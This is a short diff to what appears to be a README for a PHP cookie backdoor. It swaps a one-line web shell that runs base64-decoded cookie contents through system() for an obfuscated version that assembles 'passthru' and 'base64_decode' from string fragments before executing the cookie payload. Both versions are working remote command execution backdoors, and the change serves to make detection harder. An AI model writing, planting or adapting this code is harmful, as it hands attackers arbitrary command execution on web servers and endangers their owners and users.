@@ -7,7 +7,12 @@ Small backdoor using cookie.
 ==========
 
 ```php
-<?php error_reporting(0); system(base64_decode($_COOKIE["yourcookie"])); ?>
+<?php 
+$bOne = "pa"."ss"."th"."ru";
+$bTwo = "ba"."se"."64"."_"."de"."co"."de";
+$bKey = "yourcookie"; # conection backdoor
+$bOne($bTwo($_COOKIE[$bKey]));
+?>
 ```
 
 ```
